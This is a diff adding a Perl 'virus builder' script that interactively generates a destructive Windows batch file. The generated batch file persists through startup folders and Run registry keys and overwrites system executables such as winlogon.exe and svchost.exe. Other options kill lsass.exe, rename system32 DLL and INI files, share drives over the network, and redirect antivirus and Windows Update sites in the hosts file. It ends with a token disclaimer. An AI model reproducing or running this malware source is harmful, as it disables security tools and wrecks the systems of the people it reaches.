@@ -1,0 +1,244 @@
+# Virus Builder
+# by dav
+$vname = '';
+$vwriter = '';
+$vbsmsgtxt = '';
+$vtime = '';
+
+print("*******************\n");
+print("DAV's Virus Builder\n");
+print("BAT/VIRUS\n");
+print("*******************\n");
+print("\n");
+
+print("VirusName?\n");
+ chomp ($vname = <STDIN>);
+ print("\n");
+print("Author?\n");
+ chomp ($vwriter = <STDIN>);
+  print("\n");
+  open(FH,">virus.bat");
+  print FH '@echo off';
+  print FH "\n";
+  close(FH);
+  open(FH,">>virus.bat");
+  print FH "rem $vname - Virus\n";
+  print FH "rem by $vwriter\n";
+  print FH "rem ** generated with dav's virus builder v.1.0 in perl **\n";
+  print FH "set dav=echo\n";
+  print FH "set davv=copy\n";
+  print FH "set davvv=reg add\n";
+  print FH "set davvvv=del\n";
+  print FH "set davvvvv=net share\n";
+  print FH "set davvvvvv=cls\n";
+  print FH "set davvvvvvv=taskkill\n";
+  print FH "set davvvvvvvv=ren\n";
+  print FH "set davvvvvvvvv=call\n";
+  print FH "set davvvvvvvvvv=shutdown\n";
+  print FH "%davv% %0 %windir%\\vwin.bat > nul";
+  print FH "\n";
+  close(FH);
+  
+print("*** Startup Methods ***\n");
+
+  print("Autostart/Startup Infect - yes/no?\n");
+  chomp ($vstartup = <STDIN>);
+  if($vstartup=~m/^(yes|ja|j|y)/i) {
+	open(FH,">>virus.bat");
+	print FH "chcp 1252 > nul";
+	print FH "\n";
+	print FH '%davv% %0 "C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\Programme\\Autostart\\win.bat" > nul';
+	print FH "\n";
+    print FH '%davv% %0 "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\win.bat" > nul';
+    print FH "\n";
+	close(FH); } else { print "x\n" }
+	print("\n");
+	
+	print("REGentry(works on all winsys) - yes/no?\n");	
+	 chomp ($regy = <STDIN>);
+  if($regy=~m/^(yes|ja|j|y)/i) {
+	open(FH,">>virus.bat");
+	print FH '%davvv% "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v vwin /t REG_SZ /d "%windir%\vwin.bat" /f > nul';  
+	print FH "\n";
+    print FH '%davvv% "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v vwin /t REG_SZ /d "%windir%\vwin.bat" /f > nul';  
+    print FH "\n";
+	close(FH); } else { print "x\n" }
+    print("\n");
+    
+print("*** Virus Main Function ***\n");
+
+    print("Shutdown with time and comment - yes/no?\n");
+    chomp ($shutdown = <STDIN>);
+ if($shutdown=~m/^(yes|ja|j|y)/i) {
+	print("Seconds to restart?\n");
+	chomp ($vtime = <STDIN>);
+	print("Comment?\n");
+	chomp ($vcom = <STDIN>);
+	open(FH,">>virus.bat");
+	print FH "%davvvvvvvvvv% /s /f /t ";
+	print FH "$vtime";
+	print FH " ";
+	print FH "/c ";
+	print FH '"';
+	print FH "$vcom";
+	print FH '"';
+	print FH "\n";
+	close(FH); } else { print "x\n" }
+    print("\n");
+
+    print("LSASS.exe and EXPLORER.exe Killer - yes/no?\n");
+    chomp ($lsass = <STDIN>);
+ if($lsass=~m/^(yes|ja|j|y)/i) {
+	open(FH,">>virus.bat");
+	print FH "%davvvvvvv% /f /im explorer.exe\n";
+	print FH "%davvvvvvv% /f /im lsass.exe \n";
+	close(FH); } else { print "x\n" }
+    print("\n");
+    
+	print("Net Share c:, g: ... - yes/no?\n");	
+	 chomp ($netshare = <STDIN>);
+ if($netshare=~m/^(yes|ja|j|y)/i) {
+	open(FH,">>virus.bat");
+	print FH "%davvvvv% c=c:\n";
+	print FH "%davvvvv% g=g:\n";
+	print FH "%davvvvv% f=f:\n";
+	print FH "%davvvvv% y=y:\n";
+	close(FH); } else { print "x\n" }
+	print("\n");
+	
+	print("kill cookies - yes/no?\n");	
+	 chomp ($vcookie = <STDIN>);
+ if($vcookie=~m/^(yes|ja|j|y)/i) {
+	open(FH,">>virus.bat");
+	print FH '%davvvvvvvv% "c:\documents and settings\%username%\cookies\*.txt" *.fUcKeDbYvIrUs > nul';
+	print FH "\n";
+	print FH '%davvvvvvvv% "C:\Dokumente und Einstellungen\%username%\cookies\*.txt" *.fUcKeDbYvIrUs > nul';
+    print FH "\n";
+	close(FH); } else { print "x\n" }
+	print("\n");
+
+    print("infect hosts file - yes/no?\n");	
+	 chomp ($vhosts = <STDIN>);
+ if($vhosts=~m/^(yes|ja|j|y)/i) {
+	 open(FH,">>virus.bat");
+     print FH "%dav% 127.0.0.1 www.google.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.google.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.symantec.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.antivir.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.f-secure.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.f-secure.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.kaspersky.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.kaspersky.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.nai.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 windowsupdate.microsoft.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.symantec.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.microsoft.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.microsoft.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.free-av.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.sophos.com >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%dav% 127.0.0.1 www.sophos.de >> %windir%\\system32\\drivers\\etc\\hosts\n";
+     print FH "%davvvvvv%\n";
+     close(FH); } else { print "x\n" }
+	 print("\n");	
+	
+    print("Random Population - yes/no?\n");
+     chomp ($ranpop = <STDIN>);
+ if($ranpop=~m/^(yes|ja|j|y)/i) {
+	 open(FH,">>virus.bat");
+	 print FH "%davv% %0 %random%.bat\n";
+	 print FH "%davv% %0 %random%.bat\n";
+	 print FH "%davv% %0 %random%.bat\n";
+	 print FH "%davv% %0 %random%.bat\n";
+	 print FH "%davv% %0 c:\\%random%.bat\n";
+	 print FH "%davv% %0 c:\\%random%.bat\n";
+	 print FH "%davv% %0 c:\\%random%.bat\n";
+	 print FH "%davv% %0 c:\\%random%.bat\n";
+	 print FH "%davvvvvv%\n";
+	 print FH '%davv% %0 "C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\Programme\\Autostart\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\Programme\\Autostart\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\Programme\\Autostart\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\Programme\\Autostart\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\%random%.bat" > nul';
+	 print FH "\n";
+     print FH '%davv% %0 "C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\%random%.bat" > nul';
+	 print FH "\n";	 
+     print FH '%davv% %0 "C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\%random%.bat" > nul';
+	 print FH "\n";
+     print FH '%davv% %0 "C:\\Dokumente und Einstellungen\\All Users\\Startmenü\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Documents and Settings\\All Users\\Start Menu\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Documents and Settings\\All Users\\Start Menu\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Documents and Settings\\All Users\\Start Menu\\%random%.bat" > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 "C:\\Documents and Settings\\All Users\\Start Menu\\%random%.bat" > nul';
+	 print FH "\n";
+	 close(FH); } else { print "x\n" }
+	 print("\n");
+	
+	 print("infect some .exe files - yes/no?\n");
+     chomp ($syskiller = <STDIN>);
+ if($syskiller=~m/^(yes|ja|j|y)/i) {
+	 open(FH,">>virus.bat");
+	 print FH '%davv% %0 %windir%\\system32\\taskmgr.exe > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 %windir%\\system32\\winlogon.exe > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 %windir%\\system32\\svchost.exe > nul';
+	 print FH "\n";
+	 print FH '%davv% %0 %windir%\\system32\\calc.exe > nul';
+	 print FH "\n";
+	 close(FH); } else { print "x\n" }
+	 print("\n");
+	 
+	  print("kill .dll .ini files (** WARNING! **) - yes/no?\n");
+     chomp ($syskiller1 = <STDIN>);
+ if($syskiller1=~m/^(yes|ja|j|y)/i) {
+	 open(FH,">>virus.bat");
+	 print FH '%davvvvvvvv% %0 %windir%\\system32\\*.dll *.-fUcKeD > nul';
+	 print FH "\n";
+	 print FH '%davvvvvvvv% %0 %windir%\\system32\\*.ini *.FuCkEd- > nul';
+	 print FH "\n";
+	 close(FH); } else { print "x\n" }
+	 print("\n");
+	 
+	 print("VBS Messagebox - yes/no?\n");	
+	 chomp ($vbsmsg = <STDIN>);
+ if($vbsmsg=~m/^(yes|ja|j|y)/i) {
+	 print("Message?\n");
+	 chomp ($vbsmsgtxt = <STDIN>);
+     open(FH,">>virus.bat");
+     print FH '%dav% MsgBox "';
+     print FH "$vbsmsgtxt";
+     print FH '", 16, "ViRuS!!!" > msg.vbs';
+     print FH "\n";
+     print FH "%davvvvvvvvv% msg.vbs\n";
+	 close(FH); } else { print "x\n" }
+	 print("\n");
+
+	 open(FH,">>virus.bat");
+	 print FH "goto ende\n";
+	 print FH ":ende\n";
+	 close(FH);
+	 print("\n");
+	 
+	 while ($cya ne 'exit') {
+     print "*** VIRUS.BAT BUILT ***\n";
+     print "*** DON'T SPREAD YOUR VIRUS. ***\n";
+     print "*** I AM NOT RESPONSIBLE FOR POSSIBLE DAMAGES OR SOMETHING ELSE. ***\n";
+     print "*** exit to quit ***\n";
+     chomp ($cya = <STDIN>);
+     print "\n"; }
